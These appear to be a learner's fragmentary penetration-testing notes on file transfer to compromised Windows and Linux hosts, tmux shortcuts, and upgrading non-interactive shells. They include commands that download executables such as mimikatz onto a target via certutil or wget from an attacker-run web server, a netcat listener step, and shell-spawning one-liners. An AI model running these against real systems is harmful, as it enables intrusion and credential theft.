## Transferring Files
 sudo nmap -sV -sT -sC {IP} -p- --open

heart 1
#####  set up webserver with python
Two step approach where you need to host the files you want to transfer on a web server (1) and download the files hosted on the web server to the target system (2). 

**SimpleHTTPServer => python2
http.server => python3** 

- copy file: `cp path/file.exe .` 
- set up http server: 
	- with python2: `python -m SimpleHTTPServer port`
	- with python 3: `python3 -m http.server port`


##### Transfer to windows targets

- exploit vulnerability with searchsploit
- read comments in exploit file 
- start http server in correct location where file is stored: 
- set up netcat listener 
- simple command shell session is established (if it did not work run again )
transfer file to target system in `tmp` directory 
![[Pasted image 20230924135933.png]]
- ./mimikatz.exe is to execute the file

Downloading without python http-server
- in a command shell, download file: `certutil -urlcache -f http://adres_webserver
- _ip/filename_downloading.exe file_savingname.exe`

10.2.29.11 target  util -urlcache -f http://
10.10.11.2

Go to binaries 
![[Pasted image 20230924135232.png]] 

##### Transfer to linux targets 



- **tmux** (multiple terminal sessions in 1)
	- new: control + B + C 
	- *  is waar je nu active in bent 
	- new: control + B + 0 
	- control + pijltjes om te scrollen 
	- to get a list of all commands: `Ctrl+b` `?` 
	- detach from the Tmux session and return to your normal shell by typing: `Ctrl+b` `d
	-  `Ctrl+b` `c` Create a new window (with shell)
	- `Ctrl+b` `w` Choose window from a list
	- `Ctrl+b` `0` Switch to window 0 (by number )
	- `Ctrl+b` `,` Rename the current window
	- `Ctrl+b` `%` Split current pane horizontally into two panes
	- `Ctrl+b` `"` Split current pane vertically into two panes
	- `Ctrl+b` `o` Go to the next pane
	- `Ctrl+b` `;` Toggle between the current and previous pane
	- `Ctrl+b` `x` Close the current pane
	- `q` om te kunnen typen 


/samba/is_known_pipename
- `/bin/bash -i `
- `cat /etc/*release`

transfer file to victim 
- set up python file server in the right path: `python3 -m http.server 80` 
- Download file `wget http://adres_webserver/filename.exe ` 





## Shells 

##### Upgrading non-interactive shells 

Non interactive shell is a shell without a prompt ![[Pasted image 20230920164420.png]]

**How to get interactive shell**

Whenever you gain access to the target system with a non-interactive command shell, it is always recommended to upgrade the shell to avoid any issues with input and output.

The first technique involves spawning a **bash** session, this can be done by running the following command:


Method 1
- list shells installed don system: `cat /etc/sells 
	- use any of the shells and add `-i `
	
Method 2 getting interactive shell with programming languages 
- version of python is installed: `python --version`
	- `python -c 'import pty; pty.spawn("/bin/bash")' `
- perl
	- `perl help `
	- `perl: exec "/bin/bash";
- ruby
	- `ruby: exec "bin/bash"`

**`python -c 'import pty; pty.spawn("/bin/bash")' `**
	1. `python -c`: This part of the command invokes the Python interpreter with the `-c` option, which allows you to run a Python one-liner directly from the command line.
	2. `'import pty;pty.spawn("/bin/bash")'`: This is the Python one-liner that's executed. Let's break it down further:
	    - `import pty`: This imports the `pty` module in Python. The `pty` module provides functions for working with pseudo-terminals.
	    - `pty.spawn("/bin/bash")`: This line uses the `spawn` function from the `pty` module to start an interactive `/bin/bash` shell. It essentially creates a new pseudo-terminal and attaches it to the `/bin/bash` process, effectively turning the current non-interactive shell into an interactive Bash shell.
	    

Method: 3 getting interactive shell 
Get interactive shell through:
- Enter the following command to set the PATH environment variable, which tells the system where to find executable files: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
- This will display a list of environment variables, including the one you just set. `env` 
- This command specifies the terminal type you'll be using in your shell session. `export TERM=xterm
- This command sets your default shell to Bash. `export SHELL=bash` 
	- or try `chsh -s /bin/bash `
- to view the contents of the current directory with additional details (including file sizes and permissions), use the following command:  `ls -alps`  
